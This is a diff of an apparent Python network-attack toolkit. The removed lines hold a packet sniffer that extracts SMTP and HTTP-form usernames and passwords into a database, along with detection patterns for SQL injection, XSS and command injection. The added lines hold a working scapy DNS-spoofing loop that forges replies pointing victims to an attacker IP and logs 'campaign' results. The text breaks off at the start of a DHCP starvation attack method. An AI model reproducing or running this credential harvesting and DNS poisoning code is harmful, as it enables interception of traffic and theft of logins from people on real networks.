-            # Silently handle exception - consider logging in production
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] Exception: {e}")
-    
-    def _analyze_smtp_packet(self, packet, config, src_ip, dst_ip, payload):
-        """Analyze SMTP packet"""
-        from colorama import Fore, Style
-        import base64
-        
-        try:
-            if 'AUTH PLAIN' in payload and config['extract_smtp_creds']:
-                try:
-                    auth_data = payload.split('AUTH PLAIN ')[1].split('\r\n')[0]
-                    decoded = base64.b64decode(auth_data).decode('utf-8')
-                    parts = decoded.split('\x00')
-                    if len(parts) >= 3:
-                        username = parts[1]
-                        password = parts[2]
-                        self._store_credentials(config, 'SMTP', src_ip, dst_ip, username, password)
-                        print(f"\n{Fore.RED}🔐 SMTP CREDENTIALS: {username}:{password} from {src_ip}{Style.RESET_ALL}")
+                    with open(config['domain_file'], 'r') as f:
+                        domains.extend([line.strip() for line in f if line.strip()])
                 except Exception as e:
                     # Silently handle exception - consider logging in production
                     if hasattr(self, "debug") and getattr(self, "debug", False):
                         print(f"[DEBUG] Exception: {e}")
-        except Exception as e:
-            # Silently handle exception - consider logging in production
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] Exception: {e}")
-    
-    def _analyze_telnet_packet(self, packet, config, src_ip, dst_ip, payload):
-        """Analyze Telnet packet"""
-        from colorama import Fore, Style
-        
-        try:
-            if config['extract_telnet_creds']:
-                # Telnet credentials are harder to extract, typically need session reassembly
-                # This is a simplified version
-                if 'login:' in payload.lower() or 'username:' in payload.lower():
-                    print(f"\n{Fore.YELLOW}⚠  Telnet login prompt detected from {src_ip}{Style.RESET_ALL}")
-        except Exception as e:
-            # Silently handle exception - consider logging in production
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] Exception: {e}")
-    
-    def _analyze_tls_packet(self, packet, config, src_ip, dst_ip, payload):
-        """Analyze TLS/SSL packet"""
-        try:
-            # TLS handshake analysis
-            # Check for SSL/TLS version, cipher suites, etc.
-            # This would require more complex parsing
-            pass
-        except Exception as e:
-            # Silently handle exception - consider logging in production
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] Exception: {e}")
-    
-    def _analyze_ssh_packet(self, packet, config, src_ip, dst_ip, payload):
-        """Analyze SSH packet"""
-        try:
-            # SSH version detection
-            if payload.startswith(b'SSH-'):
-                version = payload.split(b'\r\n')[0].decode('utf-8', errors='ignore')
-                # Could log SSH version
-        except Exception as e:
-            # Silently handle exception - consider logging in production
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] Exception: {e}")
-    
-    def _analyze_smb_packet(self, packet, config, src_ip, dst_ip, payload):
-        """Analyze SMB packet"""
-        try:
-            # SMB analysis - complex protocol
-            # Would need proper SMB parser
-            pass
-        except Exception as e:
-            # Silently handle exception - consider logging in production
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] Exception: {e}")
-    
-    def _analyze_rdp_packet(self, packet, config, src_ip, dst_ip, payload):
-        """Analyze RDP packet"""
-        try:
-            # RDP analysis
-            pass
-        except Exception as e:
-            # Silently handle exception - consider logging in production
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] Exception: {e}")
-    
-    def _detect_arp_spoof(self, packet, config):
-        """Detect ARP spoofing"""
-        from scapy.all import ARP
-        from colorama import Fore, Style
-        import time
-        
-        try:
-            if not hasattr(self, '_arp_cache'):
-                self._arp_cache = {}
             
-            ip = packet[ARP].psrc
-            mac = packet[ARP].hwsrc
-            
-            # Check if IP-MAC binding changed
-            if ip in self._arp_cache:
-                if self._arp_cache[ip] != mac:
-                    # Possible ARP spoofing
-                    alert_msg = f"ARP spoofing detected: {ip} changed from {self._arp_cache[ip]} to {mac}"
-                    print(f"\n{Fore.RED}🚨 ALERT: {alert_msg}{Style.RESET_ALL}")
-                    
-                    if config['enable_database']:
-                        self._store_alert(config, 'arp_spoof', 'high', ip, '', alert_msg)
-            
-            self._arp_cache[ip] = mac
-            
-        except Exception as e:
-            # Silently handle exception - consider logging in production
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] Exception: {e}")
+            return list(set(domains))  # Remove duplicates
     
-    def _detect_dns_tunnel(self, packet, config, src_ip):
-        """Detect DNS tunneling"""
-        from scapy.all import DNS, DNSQR
-        from colorama import Fore, Style
-        
-        try:
-            if packet.haslayer(DNSQR):
-                query = packet[DNSQR].qname.decode('utf-8')
+    
+        def _dns_spoof_loop(self, config, spoof_domains):
+            """Main DNS spoofing loop"""
+            from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, sniff, send
+            from colorama import Fore, Style
+            import time
+            import random
+            
+            spoof_count = 0
+            query_count = 0
+            start_time = time.time()
+            
+            def process_dns_packet(packet):
+                nonlocal spoof_count, query_count
                 
-                # Check for suspicious patterns
-                # Long subdomain names (>50 chars)
-                # High entropy
-                # Unusual TLDs
-                if len(query) > 50:
-                    alert_msg = f"Possible DNS tunneling: Long query from {src_ip}: {query}"
-                    print(f"\n{Fore.YELLOW}⚠  ALERT: {alert_msg}{Style.RESET_ALL}")
-                    
-                    if config['enable_database']:
-                        self._store_alert(config, 'dns_tunnel', 'medium', src_ip, '', alert_msg)
-        except Exception as e:
-            # Silently handle exception - consider logging in production
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] Exception: {e}")
-    
-    def _detect_port_scan(self, config, stats):
-        """Detect port scanning"""
-        # Would need to track connection attempts per source IP
-        # This is a simplified version
-        pass
-    
-    def _match_patterns(self, packet, config, payload):
-        """Match custom patterns"""
-        import re
-        
-        try:
-            # Keyword search
-            if config['keyword_search']:
-                keywords = config['keyword_search'].split(',')
-                for keyword in keywords:
-                    if keyword.strip().lower() in payload.lower():
-                        print(f"Pattern match: {keyword}")
-            
-            # Regex patterns
-            if config['regex_patterns']:
-                patterns = config['regex_patterns'].split(';')
-                for pattern in patterns:
-                    if re.search(pattern, payload, re.IGNORECASE):
-                        print(f"Regex match: {pattern}")
-        except Exception as e:
-            # Silently handle exception - consider logging in production
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] Exception: {e}")
-    
-    def _extract_form_credentials(self, config, src_ip, dst_ip, body):
-        """Extract credentials from form data"""
-        from colorama import Fore, Style
-        import urllib.parse
-        
-        try:
-            params = urllib.parse.parse_qs(body)
-            
-            username = None
-            password = None
-            
-            # Common field names
-            username_fields = ['username', 'user', 'email', 'login', 'user_name']
-            password_fields = ['password', 'pass', 'pwd', 'passwd']
-            
-            for field in username_fields:
-                if field in params:
-                    username = params[field][0]
-                    break
-            
-            for field in password_fields:
-                if field in params:
-                    password = params[field][0]
-                    break
-            
-            if username and password:
-                self._store_credentials(config, 'HTTP-POST', src_ip, dst_ip, username, password)
-                print(f"\n{Fore.RED}🔐 HTTP POST: {username}:{password} from {src_ip}{Style.RESET_ALL}")
-        except Exception as e:
-            # Silently handle exception - consider logging in production
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] Exception: {e}")
-    
-    def _store_packet(self, config, timestamp, src_ip, dst_ip, src_port, dst_port, protocol, length, payload):
-        """Store packet in database"""
-        import sqlite3
-        
-        try:
-            conn = sqlite3.connect(config['db_file'])
-            cursor = conn.cursor()
-            
-            payload_str = payload.decode('utf-8', errors='ignore') if payload else None
-            
-            cursor.execute('''
-                INSERT INTO packets (campaign_id, timestamp, src_ip, dst_ip, src_port, dst_port, 
-                                   protocol, length, payload)
-                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
-            ''', (config['campaign_id'], timestamp, src_ip, dst_ip, src_port, dst_port,
-                  protocol, length, payload_str))
-            
-            conn.commit()
-            conn.close()
-        except Exception as e:
-            # Silently handle exception - consider logging in production
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] Exception: {e}")
-    
-    def _store_credentials(self, config, protocol, src_ip, dst_ip, username, password):
-        """Store extracted credentials"""
-        import sqlite3
-        import time
-        
-        try:
-            conn = sqlite3.connect(config['db_file'])
-            cursor = conn.cursor()
-            
-            cursor.execute('''
-                INSERT INTO credentials (campaign_id, timestamp, protocol, source_ip, 
-                                       destination_ip, username, password)
-                VALUES (?, ?, ?, ?, ?, ?, ?)
-            ''', (config['campaign_id'], time.time(), protocol, src_ip, dst_ip, username, password))
-            
-            config['credentials_found'] += 1
-            
-            conn.commit()
-            conn.close()
-        except Exception as e:
-            # Silently handle exception - consider logging in production
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] Exception: {e}")
-    
-    def _store_cookies(self, config, src_ip, host, cookies):
-        """Store extracted cookies"""
-        # Could implement cookie storage
-        pass
-    
-    def _store_http_request(self, config, src_ip, method, host, path, user_agent, cookies):
-        """Store HTTP request"""
-        import sqlite3
-        import time
-        
-        try:
-            conn = sqlite3.connect(config['db_file'])
-            cursor = conn.cursor()
-            
-            cursor.execute('''
-                INSERT INTO http_requests (campaign_id, timestamp, source_ip, method, 
-                                         host, path, user_agent, cookies)
-                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
-            ''', (config['campaign_id'], time.time(), src_ip, method, host, path, user_agent, cookies))
-            
-            conn.commit()
-            conn.close()
-        except Exception as e:
-            # Silently handle exception - consider logging in production
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] Exception: {e}")
-    
-    def _store_dns_query(self, config, src_ip, query_name, query_type):
-        """Store DNS query"""
-        import sqlite3
-        import time
-        
-        try:
-            conn = sqlite3.connect(config['db_file'])
-            cursor = conn.cursor()
-            
-            cursor.execute('''
-                INSERT INTO dns_queries (campaign_id, timestamp, source_ip, query_name, query_type)
-                VALUES (?, ?, ?, ?, ?)
-            ''', (config['campaign_id'], time.time(), src_ip, query_name, query_type))
-            
-            conn.commit()
-            conn.close()
-        except Exception as e:
-            # Silently handle exception - consider logging in production
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] Exception: {e}")
-    
-    def _store_alert(self, config, alert_type, severity, source_ip, dest_ip, description):
-        """Store security alert"""
-        import sqlite3
-        import time
-        
-        try:
-            conn = sqlite3.connect(config['db_file'])
-            cursor = conn.cursor()
-            
-            cursor.execute('''
-                INSERT INTO alerts (campaign_id, timestamp, alert_type, severity, 
-                                  source_ip, destination_ip, description)
-                VALUES (?, ?, ?, ?, ?, ?, ?)
-            ''', (config['campaign_id'], time.time(), alert_type, severity, source_ip, dest_ip, description))
-            
-            config['alerts_generated'] += 1
-            
-            conn.commit()
-            conn.close()
-        except Exception as e:
-            # Silently handle exception - consider logging in production
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] Exception: {e}")
-    
-    def _check_http_suspicious(self, config, src_ip, method, path, headers):
-        """Check for suspicious HTTP patterns"""
-        from colorama import Fore, Style
-        
-        try:
-            suspicious = False
-            reasons = []
-            
-            # SQL injection patterns
-            sql_patterns = ['union', 'select', '1=1', 'or 1=', 'drop table', '--', ';--']
-            for pattern in sql_patterns:
-                if pattern in path.lower():
-                    suspicious = True
-                    reasons.append(f"SQL injection pattern: {pattern}")
-            
-            # XSS patterns
-            xss_patterns = ['<script', 'javascript:', 'onerror=', 'onload=']
-            for pattern in xss_patterns:
-                if pattern in path.lower():
-                    suspicious = True
-                    reasons.append(f"XSS pattern: {pattern}")
-            
-            # Path traversal
-            if '../' in path or '..\\' in path:
-                suspicious = True
-                reasons.append("Path traversal attempt")
-            
-            # Command injection
-            cmd_patterns = ['|', ';', '&&', '`', '$(']
-            for pattern in cmd_patterns:
-                if pattern in path:
-                    suspicious = True
-                    reasons.append(f"Command injection pattern: {pattern}")
-            
-            if suspicious:
-                alert_msg = f"Suspicious HTTP request from {src_ip}: {' | '.join(reasons)}"
-                print(f"\n{Fore.YELLOW}⚠  SUSPICIOUS: {alert_msg}{Style.RESET_ALL}")
+                try:
+                    if packet.haslayer(DNS) and packet.haslayer(DNSQR):
+                        query = packet[DNSQR].qname.decode('utf-8').rstrip('.')
+                        qtype = packet[DNSQR].qtype
+                        client_ip = packet[IP].src
+                        
+                        query_count += 1
+                        
+                        # Check if domain should be spoofed
+                        should_spoof = False
+                        
+                        if config['wildcard_mode']:
+                            should_spoof = True
+                        else:
+                            if query in spoof_domains:
+                                should_spoof = True
+                            elif config['subdomain_mode']:
+                                for domain in spoof_domains:
+                                    if query.endswith(domain):
+                                        should_spoof = True
+                                        break
+                        
+                        # Apply conditional filters
+                        if should_spoof and config['source_ip_filter']:
+                            allowed_ips = config['source_ip_filter'].split(',')
+                            if client_ip not in allowed_ips:
+                                should_spoof = False
+                        
+                        if should_spoof and config['exclude_ips']:
+                            excluded_ips = config['exclude_ips'].split(',')
+                            if client_ip in excluded_ips:
+                                should_spoof = False
+                        
+                        # Random spoofing probability
+                        if should_spoof and config['random_spoof']:
+                            if random.randint(0, 100) > config['spoof_probability']:
+                                should_spoof = False
+                        
+                        if should_spoof:
+                            # Build spoofed response
+                            spoof_response = IP(dst=client_ip, src=packet[IP].dst) / \
+                                           UDP(dport=packet[UDP].sport, sport=53) / \
+                                           DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
+                                               an=DNSRR(rrname=packet[DNSQR].qname,
+                                                       ttl=config['ttl'],
+                                                       rdata=config['spoof_ip']))
+                            
+                            send(spoof_response, verbose=False, iface=config['interface'])
+                            
+                            spoof_count += 1
+                            
+                            # Display alert
+                            print(f"{Fore.GREEN}[+] SPOOFED:{Style.RESET_ALL} {client_ip} → {query} → {config['spoof_ip']}")
+                            
+                            # Log to database
+                            if config['enable_database']:
+                                self._log_dns_query(config, client_ip, query, qtype, config['spoof_ip'], True)
+                            
+                            # Check max spoofs limit
+                            if config['max_spoofs'] > 0 and spoof_count >= config['max_spoofs']:
+                                print(f"\n{Fore.YELLOW}⚠  Max spoofs limit reached{Style.RESET_ALL}")
+                                return True  # Stop sniffing
+                        
+                        elif config['log_queries']:
+                            print(f"{Fore.CYAN}[·] QUERY:{Style.RESET_ALL} {client_ip} → {query}")
+                            
+                            if config['enable_database'] and not config['log_spoofed_only']:
+                                self._log_dns_query(config, client_ip, query, qtype, '', False)
+                        
+                        # Display progress
+                        elapsed = int(time.time() - start_time)
+                        print(f"\r{Fore.CYAN}[{elapsed}s] Queries: {query_count} | Spoofed: {spoof_count}{Style.RESET_ALL}", end='', flush=True)
+                        
+                        # Check auto-stop timer
+                        if config['auto_stop_timer'] > 0 and elapsed >= config['auto_stop_timer']:
+                            print(f"\n\n{Fore.YELLOW}⚠  Auto-stop timer reached{Style.RESET_ALL}")
+                            return True
                 
-                if config['enable_database']:
-                    self._store_alert(config, 'suspicious_http', 'medium', src_ip, '', alert_msg)
-        except Exception as e:
-            # Silently handle exception - consider logging in production
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] Exception: {e}")
+                except Exception as e:
+                    # DNS packet processing error - log if debug enabled
+                    if config.get('debug'):
+                        print(f"\n[DEBUG] DNS processing error: {e}")
+            
+            try:
+                # Start sniffing DNS traffic
+                sniff(filter=f"udp port 53", prn=process_dns_packet, iface=config['interface'], store=0)
+            
+            except KeyboardInterrupt as e:
+                # Silently handle KeyboardInterrupt
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] KeyboardInterrupt: {e}")
+            
+            print(f"\n\n{Fore.YELLOW}━━━ STOPPING DNS SPOOFING ━━━{Style.RESET_ALL}\n")
     
-    def _display_packet(self, packet, src_ip, dst_ip, src_port, dst_port, protocol, display_lock):
-        """Display packet information"""
-        from colorama import Fore, Style
-        
-        try:
-            with display_lock:
-                port_info = f":{src_port} → :{dst_port}" if src_port and dst_port else ""
-                print(f"{Fore.CYAN}[{protocol}]{Style.RESET_ALL} {src_ip}{port_info} → {dst_ip}")
-        except Exception as e:
-            # Silently handle exception - consider logging in production
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] Exception: {e}")
     
-    def _display_statistics(self, config, stats, display_lock):
-        """Display capture statistics"""
-        from colorama import Fore, Style
-        import time
-        
-        try:
-            with display_lock:
-                elapsed = time.time() - stats['start_time']
-                rate = config['packets_captured'] / elapsed if elapsed > 0 else 0
-                
-                print(f"\n{Fore.CYAN}{'─' * 80}{Style.RESET_ALL}")
-                print(f"{Fore.GREEN}📊 STATISTICS{Style.RESET_ALL}")
-                print(f"  Packets: {config['packets_captured']} | Rate: {rate:.1f} pkt/s | Elapsed: {int(elapsed)}s")
-                
-                # Top protocols
-                if stats['packets_by_protocol']:
-                    print(f"\n  {Fore.YELLOW}Top Protocols:{Style.RESET_ALL}")
-                    sorted_protocols = sorted(stats['packets_by_protocol'].items(), key=lambda x: x[1], reverse=True)[:5]
-                    for proto, count in sorted_protocols:
-                        print(f"    {proto}: {count}")
-                
-                # Top ports
-                if stats['packets_by_port']:
-                    print(f"\n  {Fore.YELLOW}Top Ports:{Style.RESET_ALL}")
-                    sorted_ports = sorted(stats['packets_by_port'].items(), key=lambda x: x[1], reverse=True)[:5]
-                    for port, count in sorted_ports:
-                        print(f"    {port}: {count}")
-                
-                # Top talkers
-                if stats['top_talkers']:
-                    print(f"\n  {Fore.YELLOW}Top Talkers:{Style.RESET_ALL}")
-                    sorted_talkers = sorted(stats['top_talkers'].items(), key=lambda x: x[1], reverse=True)[:5]
-                    for ip, count in sorted_talkers:
-                        print(f"    {ip}: {count}")
-                
-                # Alerts
-                if config['alerts_generated'] > 0:
-                    print(f"\n  {Fore.RED}🚨 Alerts: {config['alerts_generated']}{Style.RESET_ALL}")
-                
-                # Credentials
-                if config['credentials_found'] > 0:
-                    print(f"\n  {Fore.RED}🔐 Credentials Found: {config['credentials_found']}{Style.RESET_ALL}")
-                
-                print(f"{Fore.CYAN}{'─' * 80}{Style.RESET_ALL}\n")
-                
-                stats['last_display'] = time.time()
-        except Exception as e:
-            # Silently handle exception - consider logging in production
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] Exception: {e}")
-    
-    def _cleanup_packet_sniffer(self, config):
-        """Cleanup and generate reports"""
-        from colorama import Fore, Style
-        import time
-        import sqlite3
-        
-        try:
-            # Update campaign end time
-            if config['enable_database']:
+        def _log_dns_query(self, config, client_ip, domain, qtype, response_ip, spoofed):
+            """Log DNS query to database"""
+            import sqlite3
+            try:
                 conn = sqlite3.connect(config['db_file'])
                 cursor = conn.cursor()
                 
                 cursor.execute('''
-                    UPDATE campaigns 
-                    SET end_time = CURRENT_TIMESTAMP,
-                        packets_captured = ?,
-                        bytes_captured = ?,
-                        alerts_generated = ?,
-                        credentials_found = ?,
-                        status = 'completed'
-                    WHERE id = ?
-                ''', (config['packets_captured'], config['bytes_captured'], 
-                      config['alerts_generated'], config['credentials_found'], 
-                      config['campaign_id']))
+                    INSERT INTO dns_queries (campaign_id, client_ip, query_domain, query_type, response_ip, spoofed)
+                    VALUES (1, ?, ?, ?, ?, ?)
+                ''', (client_ip, domain, qtype, response_ip, spoofed))
                 
                 conn.commit()
                 conn.close()
-            
-            # Generate reports
-            print(f"\n{Fore.CYAN}{'=' * 80}{Style.RESET_ALL}")
-            print(f"{Fore.CYAN}CAPTURE SUMMARY{Style.RESET_ALL}")
-            print(f"{Fore.CYAN}{'=' * 80}{Style.RESET_ALL}\n")
-            
-            elapsed = time.time() - config['start_time']
-            rate = config['packets_captured'] / elapsed if elapsed > 0 else 0
-            
-            print(f"{Fore.GREEN}✓ Capture completed{Style.RESET_ALL}")
-            print(f"\n{Fore.YELLOW}Statistics:{Style.RESET_ALL}")
-            print(f"  • Total Packets:    {config['packets_captured']}")
-            print(f"  • Capture Duration: {int(elapsed)} seconds")
-            print(f"  • Average Rate:     {rate:.1f} packets/second")
-            print(f"  • Alerts Generated: {config['alerts_generated']}")
-            print(f"  • Credentials Found:{config['credentials_found']}")
-            
-            if config['output_pcap']:
-                import os
-                if os.path.exists(config['pcap_file']):
-                    size = os.path.getsize(config['pcap_file']) / (1024*1024)
-                    print(f"\n{Fore.YELLOW}Output Files:{Style.RESET_ALL}")
-                    print(f"  • PCAP: {config['pcap_file']} ({size:.2f} MB)")
-            
-            if config['enable_database']:
-                print(f"  • Database: {config['db_file']}")
-            
-            # Generate additional reports
-            if config['output_json']:
-                self._generate_json_report(config)
-            
-            if config['output_csv']:
-                self._generate_csv_report(config)
-            
-            print(f"\n{Fore.GREEN}Analysis complete!{Style.RESET_ALL}\n")
-            
-        except Exception as e:
-            print(f"{Fore.RED}✗ Cleanup error: {str(e)}{Style.RESET_ALL}")
+            except Exception as e:
+                # Silently handle exception - consider logging in production
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] Exception: {e}")
     
-    def _generate_json_report(self, config):
-        """Generate JSON report"""
-        import json
-        import sqlite3
-        from colorama import Fore, Style
-        
-        try:
+    
+        def _cleanup_dns_spoof(self, config):
+            """Cleanup and generate reports"""
+            from colorama import Fore, Style
+            
+            print(f"{Fore.CYAN}→ Cleaning up...{Style.RESET_ALL}")
+            
+            # Generate final report
+            if config['generate_report']:
+                print(f"{Fore.CYAN}→ Generating final report...{Style.RESET_ALL}")
+                self._generate_dns_report(config)
+                print(f"{Fore.GREEN}✓ Report generated{Style.RESET_ALL}")
+            
+            print(f"\n{Fore.GREEN}✓ Cleanup completed{Style.RESET_ALL}\n")
+    
+    
+        def _generate_dns_report(self, config):
+            """Generate DNS spoofing report"""
+            formats = config['report_format']
+            if formats == 'all':
+                formats = ['txt', 'json', 'html']
+            else:
+                formats = [formats]
+            
+            for fmt in formats:
+                report_file = f"dns_report_{config['campaign_name']}.{fmt}"
+                
+                if fmt == 'txt':
+                    self._generate_dns_txt_report(config, report_file)
+                elif fmt == 'json':
+                    self._generate_dns_json_report(config, report_file)
+                elif fmt == 'html':
+                    self._generate_dns_html_report(config, report_file)
+    
+    
+        def _generate_dns_txt_report(self, config, output_file):
+            """Generate text report"""
+            import sqlite3
+            import time
+            
+            content = f"""DNS SPOOFING OPERATION - FINAL REPORT
+    {'=' * 70}
+    
+    Campaign: {config['campaign_name']}
+    Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}
+    
+    CONFIGURATION
+    -------------
+    Interface:      {config['interface']}
+    Spoof IP:       {config['spoof_ip']}
+    Wildcard Mode:  {config['wildcard_mode']}
+    Response Type:  {config['response_type']}
+    TTL:            {config['ttl']} seconds
+    
+    UPSTREAM DNS
+    ------------
+    Primary:        {config['upstream_dns']}
+    Fallback:       {config['fallback_dns']}
+    DNS-over-HTTPS: {config['dns_over_https']}
+    
+    """
+            
+            # Get statistics from database
+            if config['enable_database']:
+                try:
+                    conn = sqlite3.connect(config['db_file'])
+                    cursor = conn.cursor()
+                    
+                    cursor.execute('SELECT COUNT(*) FROM dns_queries WHERE campaign_id = 1')
+                    total_queries = cursor.fetchone()[0]
+                    
+                    cursor.execute('SELECT COUNT(*) FROM dns_queries WHERE campaign_id = 1 AND spoofed = 1')
+                    spoofed_queries = cursor.fetchone()[0]
+                    
+                    cursor.execute('SELECT COUNT(DISTINCT client_ip) FROM dns_queries WHERE campaign_id = 1')
+                    unique_clients = cursor.fetchone()[0]
+                    
+                    content += f"""STATISTICS
+    ----------
+    Total Queries:      {total_queries}
+    Spoofed Queries:    {spoofed_queries}
+    Legitimate Queries: {total_queries - spoofed_queries}
+    Unique Clients:     {unique_clients}
+    Success Rate:       {(spoofed_queries/total_queries*100) if total_queries > 0 else 0:.1f}%
+    
+    """
+                    
+                    # Top spoofed domains
+                    if config['include_top_domains']:
+                        content += "TOP SPOOFED DOMAINS\n"
+                        content += "-" * 70 + "\n"
+                        
+                        cursor.execute('''
+                            SELECT query_domain, COUNT(*) as count 
+                            FROM dns_queries 
+                            WHERE campaign_id = 1 AND spoofed = 1
+                            GROUP BY query_domain 
+                            ORDER BY count DESC 
+                            LIMIT 10
+                        ''')
+                        
+                        for row in cursor.fetchall():
+                            content += f"  {row[0]:<40} {row[1]:>5} queries\n"
+                        
+                        content += "\n"
+                    
+                    # Top clients
+                    if config['include_clients']:
+                        content += "TOP CLIENTS\n"
+                        content += "-" * 70 + "\n"
+                        
+                        cursor.execute('''
+                            SELECT client_ip, COUNT(*) as count 
+                            FROM dns_queries 
+                            WHERE campaign_id = 1
+                            GROUP BY client_ip 
+                            ORDER BY count DESC 
+                            LIMIT 10
+                        ''')
+                        
+                        for row in cursor.fetchall():
+                            content += f"  {row[0]:<20} {row[1]:>5} queries\n"
+                    
+                    conn.close()
+                except Exception as e:
+                    # Silently handle exception - consider logging in production
+                    if hasattr(self, "debug") and getattr(self, "debug", False):
+                        print(f"[DEBUG] Exception: {e}")
+            
+            with open(output_file, 'w') as f:
+                f.write(content)
+    
+    
+        def _generate_dns_json_report(self, config, output_file):
+            """Generate JSON report"""
+            import json
+            import sqlite3
+            import time
+            
             report = {
-                'campaign_id': config['campaign_id'],
-                'interface': config['interface'],
-                'filter': config['bpf_filter'],
-                'start_time': config['start_time'],
-                'packets_captured': config['packets_captured'],
-                'alerts_generated': config['alerts_generated'],
-                'credentials_found': config['credentials_found'],
-                'top_protocols': {},
-                'alerts': [],
-                'credentials': []
+                'campaign': config['campaign_name'],
+                'timestamp': time.time(),
+                'configuration': {
+                    'interface': config['interface'],
+                    'spoof_ip': config['spoof_ip'],
+                    'wildcard_mode': config['wildcard_mode'],
+                    'upstream_dns': config['upstream_dns']
+                },
+                'statistics': {},
+                'top_domains': [],
+                'top_clients': []
             }
             
+            # Get data from database
             if config['enable_database']:
-                conn = sqlite3.connect(config['db_file'])
-                cursor = conn.cursor()
-                
-                # Get alerts
-                cursor.execute('''
-                    SELECT alert_type, severity, source_ip, description, timestamp
-                    FROM alerts WHERE campaign_id = ?
-                    ORDER BY timestamp DESC LIMIT 100
-                ''', (config['campaign_id'],))
-                
-                for row in cursor.fetchall():
-                    report['alerts'].append({
-                        'type': row[0],
-                        'severity': row[1],
-                        'source_ip': row[2],
-                        'description': row[3],
-                        'timestamp': row[4]
-                    })
-                
-                # Get credentials
-                cursor.execute('''
-                    SELECT protocol, source_ip, username, password, timestamp
-                    FROM credentials WHERE campaign_id = ?
-                    ORDER BY timestamp DESC
-                ''', (config['campaign_id'],))
-                
-                for row in cursor.fetchall():
-                    report['credentials'].append({
-                        'protocol': row[0],
-                        'source_ip': row[1],
-                        'username': row[2],
-                        'password': row[3],
-                        'timestamp': row[4]
-                    })
-                
-                conn.close()
+                try:
+                    conn = sqlite3.connect(config['db_file'])
+                    cursor = conn.cursor()
+                    
+                    cursor.execute('SELECT COUNT(*) FROM dns_queries WHERE campaign_id = 1')
+                    total = cursor.fetchone()[0]
+                    
+                    cursor.execute('SELECT COUNT(*) FROM dns_queries WHERE campaign_id = 1 AND spoofed = 1')
+                    spoofed = cursor.fetchone()[0]
+                    
+                    report['statistics'] = {
+                        'total_queries': total,
+                        'spoofed_queries': spoofed,
+                        'legitimate_queries': total - spoofed
+                    }
+                    
+                    cursor.execute('''
+                        SELECT query_domain, COUNT(*) 
+                        FROM dns_queries 
+                        WHERE campaign_id = 1 AND spoofed = 1
+                        GROUP BY query_domain 
+                        ORDER BY COUNT(*) DESC 
+                        LIMIT 10
+                    ''')
+                    
+                    for row in cursor.fetchall():
+                        report['top_domains'].append({'domain': row[0], 'count': row[1]})
+                    
+                    conn.close()
+                except Exception as e:
+                    # Silently handle exception - consider logging in production
+                    if hasattr(self, "debug") and getattr(self, "debug", False):
+                        print(f"[DEBUG] Exception: {e}")
             
-            # Write JSON file
-            with open(config['json_file'], 'w') as f:
+            with open(output_file, 'w') as f:
                 json.dump(report, f, indent=2)
-            
-            print(f"  • JSON: {config['json_file']}")
-            
-        except Exception as e:
-            if config['debug_mode']:
-                print(f"{Fore.RED}✗ JSON report error: {str(e)}{Style.RESET_ALL}")
     
-    def _generate_csv_report(self, config):
-        """Generate CSV report"""
-        import csv
-        import sqlite3
-        from colorama import Fore, Style
+    
+        def _generate_dns_html_report(self, config, output_file):
+            """Generate HTML report"""
+            import time
+            
+            html = f"""<!DOCTYPE html>
+    <html>
+    <head>
+        <title>DNS Report - {config['campaign_name']}</title>
+        <style>
+            body {{ font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }}
+            .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; }}
+            h1 {{ color: #333; border-bottom: 3px solid #3498db; padding-bottom: 10px; }}
+            table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
+            th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }}
+            th {{ background: #3498db; color: white; }}
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1>DNS Spoofing Operation Report</h1>
+            <p><strong>Campaign:</strong> {config['campaign_name']}</p>
+            <p><strong>Generated:</strong> {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
+            
+            <h2>Configuration</h2>
+            <table>
+                <tr><td><strong>Interface</strong></td><td>{config['interface']}</td></tr>
+                <tr><td><strong>Spoof IP</strong></td><td>{config['spoof_ip']}</td></tr>
+                <tr><td><strong>Wildcard Mode</strong></td><td>{config['wildcard_mode']}</td></tr>
+                <tr><td><strong>Upstream DNS</strong></td><td>{config['upstream_dns']}</td></tr>
+            </table>
+        </div>
+    </body>
+    </html>"""
+            
+            with open(output_file, 'w') as f:
+                f.write(html)
+    
         
-        try:
-            if not config['enable_database']:
+        def run_dhcp_starvation(self):
+            """
+            Enterprise DHCP Starvation & Exhaustion Platform
+            Complete DHCP attack framework with pool exhaustion and rogue server deployment
+            """
+            from colorama import Fore, Style
+            import time
+            import random
+            
+            print(f"\n{Fore.CYAN}{'=' * 70}")
